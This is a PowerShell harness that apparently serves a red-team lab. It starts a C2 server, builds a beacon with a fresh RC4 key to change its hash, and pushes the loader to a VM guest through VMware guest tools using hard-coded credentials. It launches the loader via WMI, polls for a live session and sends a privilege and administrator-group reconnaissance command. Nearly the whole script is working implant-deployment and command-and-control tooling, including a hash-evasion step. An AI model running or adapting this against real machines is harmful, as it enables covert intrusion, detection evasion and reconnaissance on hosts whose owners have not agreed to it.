# run_beacon_test.ps1 - one-shot lab loop. ASCII ONLY, NO EXCEPTIONS.
# Reason (measured 2026-10-04): this host's PowerShell reads a BOM-less UTF-8 .ps1
# as ANSI/936. A Chinese character then swallows the following ASCII char (e.g. a
# closing quote), and the whole script dies with "Unexpected token" / "missing
# terminator". Same root cause as the build.bat GBK bug. Keep automation ASCII and
# match on ASCII markers (c2ctl prints LIVE_SESSIONS=<n>).
#
# Loop: optional fresh build -> push under a timestamped name -> launch detached
# via WMI -> wait for a LIVE session (heartbeat age) -> fire ONE command -> read.
#
# usage:
#   pwsh -NoProfile -File tools\run_beacon_test.ps1 -Build
#   pwsh -NoProfile -File tools\run_beacon_test.ps1 -Payload build\loader_normal.exe -Cmd "whoami"
param(
    # NOTE: -Vmx / -Lab must be passed on the command line. Their real paths contain
    # non-ASCII characters, and a BOM-less UTF-8 .ps1 is decoded as ANSI/936 on this
    # host, so a Chinese literal inside the file can swallow the closing quote.
    # Command-line arguments arrive as Unicode text and are safe.
    [string]$Vmx = '',
    [string]$Lab = '',
    [string]$Payload = '',
    [string]$Cmd = 'whoami /priv & whoami /groups | findstr /i mandatory & net localgroup Administrators',
    [int]$PollSec = 4,
    [int]$MaxPoll = 10,
    [switch]$Build,
    [switch]$NoLaunch
)
$ErrorActionPreference = 'Continue'
if (-not $Vmx -or -not $Lab) {
    Write-Host 'ERROR: pass -Vmx <vmx> -Lab <lab dir> explicitly (see header).'
    exit 1
}
$vm = 'D:\viscalsoftware\vmctl.ps1'
$dir = Join-Path $Lab 'runs'
$ctl = Join-Path $Lab 'tools\c2ctl.py'

function RunVMRun {
    param([string]$Action, [string]$A1 = '', [string]$A2 = '', [int]$Timeout = 120)
    if ($A1 -and $A2) {
        & $vm -Vmx $Vmx -Vp '123456789' -Gu vix -Gp 'Passw0rd!' -TimeoutSec $Timeout $Action $A1 $A2
    }
    elseif ($A1) {
        & $vm -Vmx $Vmx -Vp '123456789' -Gu vix -Gp 'Passw0rd!' -TimeoutSec $Timeout $Action $A1
    }
    else {
        & $vm -Vmx $Vmx -Vp '123456789' -Gu vix -Gp 'Passw0rd!' -TimeoutSec $Timeout $Action
    }
}

try {
    $r = Invoke-WebRequest 'http://127.0.0.1:8080/' -UseBasicParsing -TimeoutSec 4
    Write-Host ('C2_UP HTTP ' + $r.StatusCode)
}
catch {
    Start-Process -FilePath python -ArgumentList 'c2_server.py', '--host', '0.0.0.0', '--port', '8080' `
        -WorkingDirectory $Lab -RedirectStandardOutput (Join-Path $dir 'c2.log') `
        -RedirectStandardError (Join-Path $dir 'c2.err') -WindowStyle Hidden
    Start-Sleep -Seconds 3
    Write-Host 'C2_RESTARTED'
}

if ($Build) {
    Write-Host '== rebuild (fresh RC4 key -> fresh hash) =='
    $inner = 'call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1 && build.bat build\beacon.exe force > build_log_force.txt 2>&1'
    cmd.exe /c $inner
    Write-Host ('BUILD_EXIT=' + $LASTEXITCODE)
    $Payload = Join-Path $Lab 'build\loader.exe'
}
if (-not $Payload) { $Payload = Join-Path $Lab 'build\loader_force.exe' }

$stamp = Get-Date -Format 'HHmmss'
$remoteName = 'ldr_' + $stamp + '.exe'
$remotePath = 'C:\Users\Public\' + $remoteName
$hash = (Get-FileHash -LiteralPath $Payload -Algorithm SHA256).Hash.Substring(0, 16)
Write-Host ('PAYLOAD=' + $Payload + ' SHA256_16=' + $hash + ' REMOTE=' + $remotePath)

if (-not $NoLaunch) {
    Write-Host '== push payload + launcher =='
    RunVMRun 'push' $Payload $remotePath 120 | Out-Null
    RunVMRun 'push' (Join-Path $dir 'guest-scripts\go2.bat') 'C:\Users\Public\go2.bat' 60 | Out-Null
    Write-Host '== launch via WMI =='
    RunVMRun 'script' ('C:\Users\Public\go2.bat ' + $remotePath) '' 90 | Out-Null
    RunVMRun 'pull' 'C:\Users\Public\launch.txt' (Join-Path $dir 'launch_last.txt') 60 | Out-Null
    $l = Get-Content (Join-Path $dir 'launch_last.txt') -ErrorAction SilentlyContinue
    Write-Host ('LAUNCH_TXT=' + $l)
}

Write-Host '== wait for a LIVE session (heartbeat age based) =='
$online = $false
for ($i = 1; $i -le $MaxPoll; $i++) {
    Start-Sleep -Seconds $PollSec
    $out = (python $ctl sessions 2>&1 | Out-String)
    $flat = $out.Trim() -replace '\s+', ' '
    Write-Host ((Get-Date -Format 'HH:mm:ss') + ' +' + ($i * $PollSec) + 's | ' + $flat)
    if ($out -match 'LIVE_SESSIONS=[1-9]') { $online = $true; break }
}

if (-not $online) {
    Write-Host 'RESULT_NO_LIVE_SESSION'
    RunVMRun 'pull' 'C:\Users\Public\lcs_trace.log' (Join-Path $dir 'lcs_trace_last.log') 60 | Out-Null
    Write-Host '--- trace ---'
    Get-Content (Join-Path $dir 'lcs_trace_last.log') -ErrorAction SilentlyContinue
    exit 2
}

Write-Host '== fire command =='
python $ctl exec 0 $Cmd
Start-Sleep -Seconds 8
Write-Host '== results =='
python $ctl results 3
Write-Host '== session state after =='
python $ctl sessions
Write-Host ('== now ' + (Get-Date -Format 'HH:mm:ss'))
